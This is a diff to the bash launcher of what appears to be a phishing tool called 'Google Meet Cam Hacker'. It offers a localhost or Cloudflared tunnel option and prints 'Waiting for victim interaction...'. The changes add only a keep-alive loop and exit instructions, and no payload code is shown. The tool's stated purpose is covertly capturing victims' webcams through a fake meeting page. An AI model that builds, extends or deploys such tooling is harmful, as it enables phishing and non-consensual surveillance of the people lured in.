@@ -36,8 +36,11 @@ function start_cloudflared() {
         exit 1
     fi
     echo -e "${CYAN}📡 Waiting for victim interaction...${RESET}"
+    echo -e "${CYAN}[i] Press Ctrl + C to stop the server and exit.${RESET}"
+    while true; do sleep 1; done
 }
 
+# Run launcher
 banner
 echo -e "${CYAN}[1] Launch Google Meet Cam Hacker${RESET}"
 read -p $'Choose an option: ' opt
@@ -53,6 +56,8 @@ if [[ $opt == 1 ]]; then
     if [[ $tunnel == 1 ]]; then
         echo -e "${GREEN}[+] Localhost server running. Open http://127.0.0.1:$PORT${RESET}"
         echo -e "${CYAN}📡 Waiting for victim interaction...${RESET}"
+        echo -e "${CYAN}[i] Press Ctrl + C to stop the server and exit.${RESET}"
+        while true; do sleep 1; done
     elif [[ $tunnel == 2 ]]; then
         start_cloudflared
     else
